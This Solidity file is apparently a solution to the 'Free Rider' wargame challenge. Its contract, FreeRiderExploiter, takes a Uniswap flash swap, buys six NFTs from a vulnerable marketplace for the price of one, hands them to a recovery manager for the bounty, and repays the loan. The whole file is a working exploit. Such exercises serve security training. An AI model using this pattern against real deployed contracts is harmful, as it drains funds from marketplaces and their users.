// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "./FreeRiderRecoveryManager.sol";
interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}
interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract FreeRiderExploiter is IUniswapV2Callee, IERC721Receiver {
    FreeRiderNFTMarketplace private immutable marketplace;
    FreeRiderRecoveryManager private immutable recoveryManager;
    IERC721 private immutable nft;
    IWETH private immutable weth;
    IUniswapV2Pair private immutable uniswapPair;
    address private immutable owner;

    constructor(
        address payable _marketplace,
        address payable _recoveryManager,
        address _nft,
        address _weth,
        address _uniswapPair
    ) {
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recoveryManager = FreeRiderRecoveryManager(_recoveryManager);
        nft = IERC721(_nft);
        weth = IWETH(_weth);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        owner = msg.sender;
    }

    function exploit() external {
        require(msg.sender == owner, "Not owner");
        
        // Flash swap 15 WETH from Uniswap
        bytes memory data = abi.encode(msg.sender);
        uniswapPair.swap(15 ether, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external override {
        require(msg.sender == address(uniswapPair), "Not Uniswap");
        require(sender == address(this), "Not self");
        
        // Unwrap WETH to ETH
        weth.withdraw(15 ether);
        
        // Buy all 6 NFTs in one transaction
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: 15 ether}(tokenIds);
        
        // Send NFTs to recovery manager
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                i,
                abi.encode(owner)
            );
        }
        
        // Repay flash swap
        uint256 fee = ((amount0 * 3) / 997) + 1;
        weth.deposit{value: amount0 + fee}();
        IERC20(address(weth)).transfer(address(uniswapPair), amount0 + fee);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
